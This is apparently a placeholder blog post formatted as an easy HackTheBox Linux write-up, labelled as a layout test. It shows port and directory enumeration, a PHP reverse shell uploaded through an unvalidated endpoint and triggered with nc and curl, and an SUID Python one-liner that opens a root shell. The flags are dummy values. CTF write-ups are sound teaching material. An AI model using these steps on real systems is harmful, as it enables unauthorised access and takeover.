---
title: "HackTheBox - Sample (Easy)"
date: 2026-02-25
categories: [HackTheBox, Linux]
tags: [htb, ctf, linux, web, privesc, sample]
image:
  path: /assets/img/htb/sample/card.png
  alt: Sample Machine
---

## Overview

| Field       | Details        |
|-------------|----------------|
| Platform    | HackTheBox     |
| Difficulty  | Easy           |
| OS          | Linux          |
| IP          | 10.10.11.xxx   |
| Retired     | 2026-02-25     |

**Summary:** This is a sample writeup post to test the blog layout. The machine involves a web vulnerability for initial foothold and a misconfigured SUID binary for privilege escalation.

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -oA nmap/sample 10.10.11.xxx
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    Apache httpd 2.4.52
```

Two ports open: SSH (22) and HTTP (80). Let's start with the web service.

### Web Enumeration

Visiting `http://10.10.11.xxx` reveals a simple web application.

```bash
gobuster dir -u http://10.10.11.xxx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/admin   (Status: 302)
/upload  (Status: 200)
/backup  (Status: 403)
```

---

## Foothold

The `/upload` endpoint accepts file uploads without proper validation.

```bash
# Create a PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit IP and port, then upload
```

Start a listener and trigger the shell:

```bash
nc -lvnp 4444
curl http://10.10.11.xxx/uploads/shell.php
```

We get a shell as `www-data`.

---

## Privilege Escalation

### Enumeration as www-data

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/python3.10
```

Python has the SUID bit set. Using GTFOBins:

```bash
python3.10 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

We are now `root`.

---

## Flags

```bash
# User flag
cat /home/sampleuser/user.txt
# → d3adb33fd3adb33fd3adb33fd3adb33f

# Root flag
cat /root/root.txt
# → c0ffee00c0ffee00c0ffee00c0ffee00
```

---

## Summary

| Step        | Technique                        |
|-------------|----------------------------------|
| Recon       | Nmap, Gobuster                   |
| Foothold    | Unrestricted File Upload (PHP)   |
| PrivEsc     | SUID Python → shell              |

---

*This is a sample post for blog layout testing purposes.*
